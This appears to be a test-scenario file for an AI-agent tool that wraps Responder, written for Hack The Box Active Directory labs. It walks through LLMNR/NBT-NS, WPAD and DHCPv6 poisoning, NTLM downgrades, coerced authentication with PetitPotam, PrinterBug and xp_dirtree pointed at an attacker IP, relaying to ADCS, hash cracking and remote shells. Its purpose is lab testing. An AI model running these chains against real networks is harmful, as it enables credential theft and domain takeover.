@@ -1,0 +1,671 @@
+# Integration Scenarios: responder
+# Required: HTB VPN connection, internal AD network with Windows clients
+# Suitable HTB Machines (Active Directory with LLMNR/NBT-NS enabled):
+#   - Certified (medium, AD, LLMNR active, exploitable ACLs, good for full chain)
+#   - Manager (medium, AD, LLMNR active on domain segment, MSSQL + hash capture)
+#   - Escape (medium, AD, SMB + MSSQL, good for capture_smb via SSRF)
+#   - Support (easy, AD, basic hash capture, good starting box)
+#   - Intelligence (medium, AD, LDAP + SMB, good for WPAD + analyze scenarios)
+#   - Scrambled (medium, AD, multiple protocols, good for multi-hash capture)
+# Prerequisites: VPN connected, tun0 interface active, target network reachable
+# IMPORTANT: Responder requires --privileged and --network=host. The MCPTestClient
+# handles this automatically (responder is in PRIVILEGED_TOOLS).
+# Run with: pytest tests/tools/test_responder.py -m integration --tool=responder -v
+#
+# Recommended HTB box: Escape (medium, AD, MSSQL SSRF triggers SMB auth to attacker,
+#   confirmed hash capture via xp_dirtree, also has network-level LLMNR traffic)
+#   Alternatives: Manager (MSSQL + SSRF trigger), Support (easy, basic LLMNR capture),
+#                 Intelligence (WPAD scenario with DNS + printer abuse)
+#
+# 3 methods: poison, analyze, capture_smb
+# Note: Responder needs broadcast traffic on the network. HTB AD labs have varying
+#   levels of LLMNR/NBT-NS traffic. SSRF-triggered capture (capture_smb) is the most
+#   reliable on HTB because it doesn't depend on passive broadcast traffic.
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# SCENARIO 1: Passive Analysis — Assess broadcast protocol activity
+# Goal: Determine if LLMNR/NBT-NS/MDNS traffic exists on the network before poisoning
+# Phase: Reconnaissance
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Step 1: Run passive analysis on VPN interface
+Method: analyze
+Args: {interface: "tun0", duration: 60, verbose: true}
+Expected: success=true, detected_protocols may contain LLMNR/NBT-NS requests
+Notes: Safe — no poisoning, no responses sent. Just listens for broadcast name
+  resolution queries. Run for 60s minimum to capture intermittent traffic.
+  On an AD network with Windows clients, you should see LLMNR requests for
+  hostnames that DNS cannot resolve (typos, old NetBIOS names, decommissioned hosts).
+
+## Step 2: Analyze results
+Expected output fields:
+  - detected_protocols: Array of log lines from Analyzer-Session.log
+  - detection_count: Number of observed events
+  - interface_used: "tun0"
+Decision: If detection_count > 0, proceed to poisoning (Scenario 2).
+  If detection_count == 0 after 60s, try longer duration (120s) or verify
+  network segment has Windows clients.
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# SCENARIO 2: LLMNR/NBT-NS Poisoning — Capture NTLMv2 hashes
+# Goal: Poison broadcast name resolution to capture domain user NTLMv2 hashes
+# Phase: Exploitation
+# Prerequisite: Scenario 1 confirmed LLMNR/NBT-NS traffic exists
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Step 1: Run full poisoning mode
+Method: poison
+Args: {interface: "tun0", duration: 300, verbose: true}
+Expected: success=true, hash_count >= 1
+Notes: Runs all 18 rogue servers + LLMNR/NBT-NS/MDNS poisoning. Duration 300s
+  (5 min) gives enough time for clients to query non-existent hostnames.
+  Watch for failed_ports in result — if ports are already in use, some
+  protocols may not capture hashes.
+
+## Step 2: Verify captured hashes
+Expected output fields:
+  - captured_hashes: Array of hash objects with module, hash_type, username, hash
+  - hash_count: Number of unique captured hashes
+  - copied_files: Paths to /session/responder/ where hashes are persisted
+Hash format: username::DOMAIN:challenge:ntproofstr:blob (hashcat mode 5600)
+Follow-up: Crack with john/hashcat. Example:
+  john --format=netntlmv2 /session/responder/SMB-NTLMv2-SSP-<IP>.txt
+  hashcat -m 5600 /session/responder/SMB-NTLMv2-SSP-<IP>.txt wordlist.txt
+
+## Step 3: Verify hash file persistence
+Check: copied_files should list files in /session/responder/
+  - SMB-NTLMv2-SSP-<client_ip>.txt — SMB hashes
+  - HTTP-NTLMv2-<client_ip>.txt — HTTP hashes (if any)
+  - Responder.db — SQLite database with all captured data
+  - Responder-Session.log — Full session log
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# SCENARIO 3: SMB Hash Capture via SSRF / Coerced Authentication
+# Goal: Capture NTLMv2 hash from a server-side request (SSRF or coerced auth)
+# Phase: Exploitation
+# Prerequisite: Have an SSRF vulnerability or coercion primitive (PetitPotam, etc.)
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Step 1: Start SMB-only capture
+Method: capture_smb
+Args: {interface: "tun0", duration: 30, verbose: true}
+Expected: success=true (even with hash_count=0 if trigger hasn't fired yet)
+Notes: Disables all poisoners and all servers except SMB (port 445).
+  This is the cleanest mode for SSRF capture — no broadcast poisoning noise.
+  Config backup/restore cycle is automatic.
+
+## Step 2: Trigger SSRF (in parallel or before capture)
+Trigger example: curl to vulnerable endpoint with UNC path
+  curl http://<target>/vulnerable?file=\\<attacker_tun0_ip>\share
+  Or: PetitPotam.py <attacker_tun0_ip> <dc_ip> -u user -p pass
+  Or: printerbug.py domain/user:pass@<dc_ip> <attacker_tun0_ip>
+Timing: Start capture_smb FIRST, then trigger within the duration window.
+  For SSRF: duration 15-30s is enough (response is immediate).
+  For coerced auth: duration 60s+ (may take time for the DC to connect back).
+
+## Step 3: Verify SMB hash capture
+Expected output fields:
+  - captured_hashes: Should contain SMB NTLMv2-SSP hash from the target machine
+  - smb_only: true (confirms only SMB was active)
+  - hash_count: Should be >= 1 if SSRF trigger worked
+Machine account hash format: MACHINE$::DOMAIN:challenge:ntproofstr:blob
+  Machine account hashes from PetitPotam/PrinterBug can be relayed with
+  ntlmrelayx (cannot be cracked — machine passwords are random 128 chars).
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# SCENARIO 4: MSSQL xp_dirtree Triggered SMB Capture
+# Goal: Capture NTLMv2 hash via MSSQL xp_dirtree SSRF
+# Phase: Exploitation
+# Prerequisite: MSSQL access (even low-priv) on the target
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Step 1: Start SMB-only capture
+Method: capture_smb
+Args: {interface: "tun0", duration: 30, verbose: true}
+Expected: success=true, SMB listener active
+
+## Step 2: Trigger via MSSQL (use netexec mssql method)
+Trigger: netexec mssql <target> -u <user> -p <pass> -q "EXEC xp_dirtree '\\<attacker_tun0_ip>\share'"
+  Or: netexec mssql <target> -u <user> -p <pass> -q "EXEC master.dbo.xp_subdirs '\\<attacker_tun0_ip>\share'"
+Notes: xp_dirtree and xp_subdirs cause the SQL Server service account to authenticate
+  to the attacker's SMB listener. This works with ANY MSSQL user — no sysadmin required.
+  The captured hash is the SQL Server service account (often a domain user or SYSTEM).
+
+## Step 3: Verify capture
+Expected: hash_count >= 1, hash contains SQL service account name
+Follow-up: If service account hash is crackable, use creds for further enumeration.
+  If machine account (MACHINE$), relay with ntlmrelayx instead of cracking.
+HTB Machines: Escape (confirmed MSSQL SSRF → hash capture), Manager, DarkZero
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# SCENARIO 5: HTTP Basic Auth Capture
+# Goal: Capture cleartext passwords by downgrading HTTP auth to Basic
+# Phase: Exploitation
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Step 1: Run poisoning with basic_auth downgrade
+Method: poison
+Args: {interface: "tun0", duration: 300, verbose: true, basic_auth: true}
+Expected: success=true, captured_hashes may include cleartext entries
+Notes: Returns HTTP 401 with Basic auth challenge instead of NTLM.
+  Clients that support Basic auth will send credentials in cleartext.
+  WARNING: Users will see a login prompt in their browser.
+  Cleartext passwords appear in captured_hashes with hash_type="ClearText".
+  No cracking needed — password is directly usable.
+
+## Step 2: Verify cleartext capture
+Expected: captured_hashes entries with:
+  - hash_type: "ClearText"
+  - cleartext: "<actual_password>"
+  - module: "HTTP" (Basic auth is HTTP only)
+Follow-up: Use credentials with netexec, impacket, or evil-winrm.
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# SCENARIO 6: WPAD Proxy Authentication Capture
+# Goal: Capture browser proxy auth from clients with WPAD auto-detection
+# Phase: Exploitation
+# Prerequisite: Windows clients with "Automatically detect settings" enabled
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Step 1: Run poisoning with WPAD enabled
+Method: poison
+Args: {interface: "tun0", duration: 300, verbose: true, wpad: true}
+Expected: success=true, hash_count >= 0
+Notes: Responds to WPAD queries with attacker's proxy config.
+  All browser HTTP traffic from clients that use WPAD will be proxied
+  through Responder's rogue proxy, triggering NTLM authentication.
+  Most effective in enterprise environments where WPAD is configured.
+
+## Step 2: Aggressive WPAD with forced auth
+Method: poison
+Args: {interface: "tun0", duration: 300, verbose: true, wpad: true, force_wpad_auth: true}
+Expected: success=true, higher hash_count than without force_wpad_auth
+Notes: Forces NTLM/Basic auth on wpad.dat retrieval itself.
+  More aggressive — may show auth prompt to users.
+  Use when standard WPAD isn't triggering enough captures.
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# SCENARIO 7: NTLMv1 Downgrade for Faster Cracking
+# Goal: Force NTLMv1 responses for faster offline cracking
+# Phase: Exploitation
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Step 1: Run poisoning with ESS disabled
+Method: poison
+Args: {interface: "tun0", duration: 300, verbose: true, disable_ess: true}
+Expected: success=true, captured_hashes with hash_type containing "NTLMv1"
+Notes: Disables Extended Session Security to force NTLMv1 downgrade.
+  NTLMv1 hashes (hashcat mode 5500) crack MUCH faster than NTLMv2 (mode 5600).
+  Only works if the client's NTLMMinClientSec policy allows NTLMv1.
+  Modern hardened Windows may refuse to downgrade.
+
+## Step 2: Run poisoning with LM downgrade (legacy networks)
+Method: poison
+Args: {interface: "tun0", duration: 300, verbose: true, lm_downgrade: true}
+Expected: success=true, captured_hashes with LM hash type
+Notes: Forces LM hashing (even weaker than NTLMv1). Only works on
+  very old Windows clients (XP, Server 2003). Unlikely on modern HTB boxes.
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# SCENARIO 8: DHCPv6 Poisoning on Dual-Stack Networks
+# Goal: Poison IPv6 name resolution via DHCPv6 Solicit messages
+# Phase: Exploitation
+# Prerequisite: Target network has IPv6 enabled (dual-stack)
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Step 1: Run poisoning with DHCPv6 enabled
+Method: poison
+Args: {interface: "tun0", duration: 300, verbose: true, dhcpv6: true}
+Expected: success=true
+Notes: Responds to DHCPv6 Solicit messages with the attacker's IP as DNS server.
+  Effective on networks where IPv6 is auto-configured but not hardened.
+  Windows clients prefer IPv6 DNS by default, so this can intercept DNS queries.
+  WARNING: May disrupt IPv6 DNS resolution on the network.
+
+## Step 2: Alternative — RDNSS Router Advertisement poisoning
+Method: poison
+Args: {interface: "tun0", duration: 300, verbose: true, rdnss: true}
+Expected: success=true
+Notes: Injects attacker IP as recursive DNS server via IPv6 Router Advertisements.
+  Alternative to DHCPv6 poisoning. Works on networks that use SLAAC for IPv6.
+
+## Step 3: Combined IPv4 + IPv6 poisoning (maximum coverage)
+Method: poison
+Args: {interface: "tun0", duration: 300, verbose: true, dhcpv6: true, wpad: true}
+Expected: success=true, captures from both IPv4 (LLMNR/NBT-NS) and IPv6 (DHCPv6)
+Notes: Maximum coverage — poisons both IPv4 and IPv6 name resolution.
+  Use when the network has dual-stack and you want maximum hash capture.
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# SCENARIO 9: WebDAV Authentication Capture
+# Goal: Force WebDAV re-authentication to capture NTLMv2 hashes
+# Phase: Exploitation
+# Prerequisite: Target clients use WebDAV (Microsoft Office, SharePoint)
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Step 1: Run poisoning with error_code flag
+Method: poison
+Args: {interface: "tun0", duration: 300, verbose: true, error_code: true}
+Expected: success=true, captured_hashes may include WebDAV client hashes
+Notes: Returns STATUS_LOGON_FAILURE for auth requests, forcing WebDAV clients
+  to re-authenticate. Particularly effective against Microsoft Office clients
+  accessing SharePoint or other WebDAV resources. The -E flag causes
+  Responder to reject the first auth attempt, triggering a second attempt
+  from the client with a new challenge — capturing a fresh NTLMv2 hash.
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# SCENARIO 10: Forced Proxy Authentication
+# Goal: Force all HTTP clients to authenticate to rogue proxy
+# Phase: Exploitation
+# WARNING: Cannot be combined with WPAD (-w)
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Step 1: Run poisoning with proxy auth
+Method: poison
+Args: {interface: "tun0", duration: 300, verbose: true, proxy_auth: true}
+Expected: success=true, hash_count should be high (all HTTP clients forced to auth)
+Notes: Forces NTLM/Basic proxy authentication on ALL HTTP requests.
+  Very aggressive — every HTTP client on the network will be prompted to
+  authenticate. High capture rate but also high noise/visibility.
+  Cannot be used with wpad=true (mutually exclusive flags).
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# SCENARIO 11: Custom External IP (Pivot Scenario)
+# Goal: Poison with a custom IP when Responder runs on a different host
+# Phase: Exploitation
+# Prerequisite: Access from a pivot host or different network segment
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Step 1: Run poisoning with external IP override
+Method: poison
+Args: {interface: "tun0", duration: 300, verbose: true, external_ip: "<pivot_ip>"}
+Expected: success=true
+Notes: Overrides the IP in poisoned responses. Use when Responder runs on
+  one host but you want clients to connect to a different host (e.g., a
+  machine running ntlmrelayx for relay attacks, or a pivot host in a
+  different subnet). The external_ip should be routable from the target clients.
+
+## Step 2: External IP with IPv6
+Method: poison
+Args: {interface: "tun0", duration: 300, verbose: true, external_ip: "<pivot_ipv4>", external_ip6: "<pivot_ipv6>"}
+Expected: success=true
+Notes: Override both IPv4 and IPv6 addresses for full dual-stack relay scenarios.
+  Useful when ntlmrelayx is running on a different machine.
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# SCENARIO 12: TTL Manipulation
+# Goal: Control how long poisoned DNS responses are cached by clients
+# Phase: Exploitation
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Step 1: Short TTL for aggressive capture
+Method: poison
+Args: {interface: "tun0", duration: 300, verbose: true, ttl: 10}
+Expected: success=true
+Notes: TTL=10 seconds means clients re-query frequently, increasing capture opportunities.
+  Useful for maximizing hash capture rate at the cost of more traffic.
+
+## Step 2: Long TTL for persistent poisoning
+Method: poison
+Args: {interface: "tun0", duration: 60, verbose: true, ttl: 600}
+Expected: success=true
+Notes: TTL=600 (10 min) means clients cache the poisoned response longer.
+  Useful when you only need to run Responder briefly but want long-lasting effect.
+  WARNING: Clients may continue to resolve the poisoned name after Responder stops,
+  potentially causing connectivity issues if the poisoned IP becomes unavailable.
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# SCENARIO 13: DHCPv4 with WPAD Injection
+# Goal: Inject WPAD configuration via DHCPv4 responses
+# Phase: Exploitation
+# WARNING: May disrupt DHCP on the network
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Step 1: Run poisoning with DHCPv4 WPAD injection
+Method: poison
+Args: {interface: "tun0", duration: 300, verbose: true, dhcp: true}
+Expected: success=true
+Notes: Responds to DHCPv4 requests with Option 252 (WPAD URL) pointing to attacker.
+  All DHCP clients that request WPAD will use attacker's proxy configuration.
+  MORE AGGRESSIVE than LLMNR poisoning — affects DHCP renewal for all clients.
+  WARNING: Can disrupt network connectivity. Use cautiously in shared environments.
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# SCENARIO 14: Combined Poison + Capture Workflow (Full Engagement)
+# Goal: Complete poisoning workflow from recon to hash cracking
+# Phase: Exploitation (multi-step)
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Step 1: Passive recon — identify broadcast traffic
+Method: analyze
+Args: {interface: "tun0", duration: 60, verbose: true}
+Expected: detection_count > 0 (LLMNR/NBT-NS queries observed)
+Decision: If traffic exists, proceed. If not, the network may have LLMNR disabled.
+
+## Step 2: Full poisoning run
+Method: poison
+Args: {interface: "tun0", duration: 300, verbose: true, wpad: true}
+Expected: hash_count >= 1
+Notes: WPAD increases capture rate by also capturing browser proxy auth.
+
+## Step 3: If no hashes from poisoning, try SSRF capture
+Method: capture_smb
+Args: {interface: "tun0", duration: 30, verbose: true}
+Trigger: Exploit known SSRF on web app or use coercion tool
+Expected: hash_count >= 1 (machine account or service account hash)
+
+## Step 4: Crack captured hashes (use john or hashcat tool)
+Follow-up tools:
+  - john: john --format=netntlmv2 /session/responder/SMB-NTLMv2-SSP-*.txt
+  - hashcat: hashcat -m 5600 hashes.txt rockyou.txt
+  - If NTLMv1 captured: hashcat -m 5500 hashes.txt rockyou.txt
+
+## Step 5: Validate cracked credentials
+Follow-up tools:
+  - netexec: smb <dc_ip> -u <user> -p <cracked_pass>
+  - evil-winrm: evil-winrm -i <dc_ip> -u <user> -p <cracked_pass>
+  - impacket: psexec.py domain/user:pass@<target>
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# SCENARIO 15: Responder + ntlmrelayx Chain (Relay instead of Crack)
+# Goal: Relay captured NTLM auth to a target with SMB signing disabled
+# Phase: Exploitation (multi-tool)
+# Prerequisite: At least one host with SMB signing not required
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Step 1: Identify relay targets (use netexec)
+Pre-check: netexec smb <subnet>/24 --gen-relay-list /session/artifacts/relay_targets.txt
+Expected: List of hosts with SMB signing disabled/not required
+Notes: Only hosts with "signing:False" can be relayed to. DCs always require signing.
+
+## Step 2: Start ntlmrelayx (use impacket-relay tool)
+Parallel: impacket ntlmrelayx -tf /session/artifacts/relay_targets.txt -smb2support
+Notes: ntlmrelayx listens on port 445 — Responder's SMB must be OFF.
+
+## Step 3: Start Responder with SMB disabled
+Method: poison
+Args: {interface: "tun0", duration: 300, verbose: true}
+Pre-config: Manually disable SMB in Responder.conf (set SMB = Off)
+  Or use capture_smb=false (not directly supported — need to edit config manually).
+Notes: Responder poisons LLMNR/NBT-NS, clients connect to attacker on port 445,
+  ntlmrelayx relays the auth to the real target. No cracking needed.
+  This is the most powerful attack when SMB signing is not enforced.
+
+## Step 4: Alternative — use external_ip for relay split
+Method: poison
+Args: {interface: "tun0", duration: 300, verbose: true, external_ip: "<ntlmrelayx_ip>"}
+Notes: Point poisoned responses directly at the ntlmrelayx listener.
+  No need to disable SMB in Responder — clients connect to ntlmrelayx's IP directly.
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# SCENARIO 16: Responder + PetitPotam Chain (DC Coercion)
+# Goal: Coerce DC authentication and relay to ADCS for domain compromise
+# Phase: Exploitation (multi-tool, high impact)
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Step 1: Start SMB capture (or ntlmrelayx)
+Method: capture_smb
+Args: {interface: "tun0", duration: 60, verbose: true}
+
+## Step 2: Trigger PetitPotam (use impacket or exploit-runner)
+Trigger: PetitPotam.py <attacker_tun0_ip> <dc_ip> -u <user> -p <pass>
+  Or unauthenticated: PetitPotam.py <attacker_tun0_ip> <dc_ip>
+Notes: PetitPotam abuses MS-EFSRPC to coerce the DC to authenticate to attacker.
+  Captured machine account hash can be relayed to ADCS (ESC8) for a certificate,
+  which gives Domain Admin via certificate-based auth.
+
+## Step 3: Verify DC machine account capture
+Expected: captured_hashes with username="DC01$" (or similar machine account)
+Notes: Machine account hashes CANNOT be cracked — relay is the only option.
+  For relay to ADCS: ntlmrelayx --target http://<ca>/certsrv/certfnsh.asp --adcs --template DomainController
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# SCENARIO 17: Analyze Only — Extended Duration for Quiet Networks
+# Goal: Detect broadcast traffic on networks with low activity
+# Phase: Reconnaissance
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Step 1: Long passive analysis
+Method: analyze
+Args: {interface: "tun0", duration: 300, verbose: true}
+Expected: detection_count may be low but non-zero on AD networks
+Notes: 5-minute passive listen catches intermittent LLMNR queries that 60s may miss.
+  LLMNR queries happen when: a user typos a hostname, a service references a
+  decommissioned host, mDNS service discovery is attempted, etc.
+
+## Step 2: Interpretation guide
+Expected output analysis:
+  - 0 detections: Network may have LLMNR disabled (Group Policy), or no Windows clients
+    on the broadcast domain, or network segmentation prevents broadcast traffic
+  - 1-5 detections: Low activity, may need longer poisoning durations (300-540s)
+  - 10+ detections: Active broadcast traffic, poisoning should be effective quickly
+  - Source IPs in detections: Identify which hosts are querying — these will authenticate
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# SCENARIO 18: Analyze on Non-Default Interface
+# Goal: Run analysis on a different network interface (e.g., after pivoting)
+# Phase: Reconnaissance
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Step 1: Analyze on eth0 (local network)
+Method: analyze
+Args: {interface: "eth0", duration: 60, verbose: true}
+Expected: success=true (if eth0 exists)
+Notes: After pivoting to an internal host, analyze broadcast traffic on the local
+  ethernet interface rather than the VPN tunnel.
+
+## Step 2: Analyze with auto-detected interface
+Method: analyze
+Args: {duration: 60, verbose: true}
+Expected: success=true, interface_used shows auto-detected interface
+Notes: Omit the interface parameter to auto-detect the first non-loopback interface
+  with an IPv4 address. Useful when you don't know the interface name.
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# ERROR SCENARIOS — PORT CONFLICTS
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Scenario 19: Port 445 conflict (SMB service running)
+Method: poison
+Args: {interface: "tun0", duration: 60, verbose: true}
+Expected: success=true (partial), failed_ports contains 445
+Notes: If an SMB service (smbd, samba) is running on the host, Responder can't
+  bind to port 445. The result will show failed_ports=[445] but other
+  protocols (HTTP, LDAP, etc.) still capture hashes.
+  error_class=config, retryable=true.
+Fix: Stop conflicting service or use capture_smb with --privileged (kills existing bindings).
+
+## Scenario 20: Port 80 conflict (web server running)
+Method: poison
+Args: {interface: "tun0", duration: 60, verbose: true}
+Expected: success=true (partial), failed_ports contains 80
+Notes: If Apache/nginx is running, HTTP capture fails but SMB/LLMNR still works.
+  Use capture_smb mode if only SMB hashes are needed.
+
+## Scenario 21: Multiple port conflicts
+Method: poison
+Args: {interface: "tun0", duration: 60, verbose: true}
+Expected: success=true (partial), failed_ports contains multiple ports
+Notes: In heavily-used containers, multiple ports may conflict. Check failed_ports
+  array and assess which protocols are still functional.
+  Agent should log which protocols are impacted and adjust expectations.
+
+## Scenario 22: SMB port conflict on capture_smb (complete failure)
+Method: capture_smb
+Args: {interface: "tun0", duration: 30, verbose: true}
+Expected: success=false, error mentions port 445
+Notes: For capture_smb, port 445 is the ONLY server. If it fails, the entire
+  capture is useless. The server returns success=false with error_class=config.
+  Fix: ensure --privileged and --network=host, stop conflicting SMB services.
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# ERROR SCENARIOS — PERMISSION AND CONFIGURATION
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Scenario 23: No --privileged flag
+Method: poison
+Args: {interface: "tun0", duration: 60, verbose: true}
+Expected: isError=true, error_class=permission, retryable=false
+Notes: Responder requires raw sockets for poisoning. Without --privileged,
+  PermissionError is thrown. MCPTestClient handles this automatically
+  (responder is in PRIVILEGED_TOOLS list).
+
+## Scenario 24: Invalid interface name
+Method: analyze
+Args: {interface: "nonexistent_iface", duration: 60, verbose: true}
+Expected: isError=true, error_class=config, retryable=false
+Notes: Specified interface doesn't exist. Error message suggests running 'ip link'.
+
+## Scenario 25: Empty interface name
+Method: analyze
+Args: {interface: "", duration: 60, verbose: true}
+Expected: isError=true, error mentions "Interface name cannot be empty"
+Notes: Empty string is treated as invalid, not as 'omitted'. Validates the
+  _resolve_interface empty-string check.
+
+## Scenario 26: Duration too short
+Method: poison
+Args: {interface: "tun0", duration: 3, verbose: true}
+Expected: isError=true, error_class=params
+Notes: Minimum duration is 5 seconds. Validates the _validate_duration check.
+
+## Scenario 27: Duration too long
+Method: poison
+Args: {interface: "tun0", duration: 600, verbose: true}
+Expected: isError=true, error_class=params
+Notes: Maximum duration is 540 seconds (leaves 60s headroom within 600s tool timeout).
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# ERROR SCENARIOS — NETWORK AND ENVIRONMENT
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Scenario 28: No VPN connection (tun0 doesn't exist)
+Method: analyze
+Args: {interface: "tun0", duration: 60, verbose: true}
+Expected: isError=true, error_class=config, message mentions interface not found
+Notes: If VPN is disconnected, tun0 interface doesn't exist. Tests interface validation.
+
+## Scenario 29: Responder binary missing
+Method: poison
+Args: {interface: "tun0", duration: 60, verbose: true}
+Expected: isError=true (FileNotFoundError or similar)
+Notes: If /usr/sbin/responder doesn't exist (broken container image), should fail clearly.
+  Tests the _run_responder error handling.
+
+## Scenario 30: Process killed during execution
+Method: poison
+Args: {interface: "tun0", duration: 300, verbose: true}
+Expected: success=true with partial results (whatever was captured before kill)
+Notes: If the MCP tool timeout (600s) kills the process mid-run, the cleanup code
+  should still parse whatever hashes were captured. The SIGTERM→SIGKILL sequence
+  in _run_responder handles this.
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# CROSS-TOOL FLOWS — RESPONDER IN ATTACK CHAINS
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Scenario 31: Responder → Hashcat → Netexec (full credential chain)
+Steps:
+  1. responder analyze: Verify LLMNR/NBT-NS traffic exists (60s)
+  2. responder poison: Capture NTLMv2 hashes (300s, wpad=true)
+  3. hashcat: Crack captured hashes (hashcat -m 5600 hashes.txt rockyou.txt)
+  4. netexec smb: Validate cracked credentials against DC
+  5. netexec ldap: Enumerate with new creds (users, groups, delegation)
+  6. evil-winrm exec: Get shell with cracked credentials
+Expected: Full chain from hash capture to shell
+HTB Machines: Support, Certified
+
+## Scenario 32: Responder capture_smb → ntlmrelayx → ADCS (ESC8)
+Steps:
+  1. Identify ADCS: certipy find -u user -p pass -dc-ip <dc_ip>
+  2. Start ntlmrelayx: ntlmrelayx -t http://<ca>/certsrv/certfnsh.asp --adcs
+  3. responder capture_smb: Or use PetitPotam to coerce DC auth to ntlmrelayx
+  4. ntlmrelayx relays DC auth → obtains DC certificate
+  5. certipy: Use certificate for domain admin auth
+Expected: Domain compromise via ADCS relay
+HTB Machines: Certified (has ADCS + vulnerable template)
+
+## Scenario 33: Responder → evil-winrm PTH (relay capture to shell)
+Steps:
+  1. responder capture_smb: Capture machine account hash via SSRF
+  2. If crackable (service account): crack → evil-winrm with password
+  3. If not crackable (machine account): relay with ntlmrelayx for SAM dump
+  4. evil-winrm PTH: Use extracted local admin hash for shell access
+Expected: SMB capture → crack/relay → WinRM shell
+HTB Machines: Escape (MSSQL SSRF → hash capture → crack → shell)
+
+## Scenario 34: PrinterBug + Responder (SpoolService coercion)
+Steps:
+  1. responder capture_smb: Start SMB listener (60s)
+  2. Trigger: printerbug.py domain/user:pass@<target> <attacker_ip>
+     Or: netexec smb <target> -u user -p pass -M spoolsampler -o LHOST=<attacker_ip>
+  3. Verify: Machine account hash captured
+  4. Relay or crack depending on hash type
+Expected: SpoolService auth coerced → NTLMv2 hash captured
+Notes: PrinterBug (MS-RPRN) is an older coercion technique. PetitPotam is preferred
+  but PrinterBug works even when MS-EFSRPC is patched.
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# SCENARIO 35: Analyze Protocol Breakdown
+# Goal: Identify which specific protocols are active for targeted poisoning
+# Phase: Reconnaissance (detailed)
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Step 1: Run extended analysis
+Method: analyze
+Args: {interface: "tun0", duration: 120, verbose: true}
+Expected: detected_protocols with protocol type indicators
+
+## Step 2: Interpret protocol types
+Analysis of detected_protocols array:
+  - Lines containing "LLMNR": Link-Local Multicast Name Resolution (IPv4/IPv6, UDP 5355)
+  - Lines containing "NBT-NS": NetBIOS Name Service (IPv4 only, UDP 137)
+  - Lines containing "MDNS": Multicast DNS (Apple/Linux discovery, UDP 5353)
+  - Lines containing "Browser": Windows Browser protocol (network shares discovery)
+Decision matrix:
+  - LLMNR detected → standard poisoning should work
+  - Only NBT-NS → older clients, may get NTLMv1 with disable_ess
+  - MDNS → Linux/Mac clients on network, may capture different credentials
+  - No traffic → LLMNR disabled by GPO, try DHCPv6 or WPAD instead
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# TROUBLESHOOTING
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Port binding errors
+Symptom: failed_ports in result, error_class="config", retryable=true
+Cause: Another service is using the same port (e.g., smbd on 445, apache on 80)
+Fix: Stop conflicting services, or use capture_smb for SMB-only mode
+
+## No hashes captured
+Possible causes:
+  1. No Windows clients on the network segment (LLMNR is Windows-only)
+  2. LLMNR/NBT-NS disabled by Group Policy (modern hardened environments)
+  3. Network segmentation — attacker not on the same broadcast domain
+  4. Duration too short — increase to 300-540s for passive capture
+  5. HTB lab may not have active broadcast traffic — use SSRF trigger instead
+Fix: Try analyze mode first to verify broadcast traffic exists.
+  If no broadcast traffic, use capture_smb with xp_dirtree/PetitPotam/PrinterBug trigger.
+
+## Permission errors
+Symptom: error_class="permission", retryable=false
+Cause: Container not running with --privileged
+Fix: MCPTestClient handles this automatically (responder in PRIVILEGED_TOOLS).
+  For manual testing: docker run --privileged --network=host ...
+
+## Interface not found
+Symptom: error_class="config", "not found" in error
+Cause: Specified interface does not exist in the container
+Fix: Use auto-detection (omit interface param) or check with 'ip link'
+
+## Config backup/restore issues
+Symptom: capture_smb leaving modified Responder.conf
+Cause: Exception in _write_smb_only_config before backup, or restore failure
+Fix: The finally block in capture_smb always restores config. If Responder.conf.bak
+  exists after a run, something went wrong — manual restore needed.
+
+## Hash file parsing failures
+Symptom: hash_count=0 but hashes visible in raw_output
+Cause: Responder.db may be locked (SQLite contention after SIGTERM)
+Fix: The server has a 5-second SQLite timeout. If DB parsing fails, it falls back to
+  file-based parsing (NTLMv*.txt files). Both methods are tried automatically.
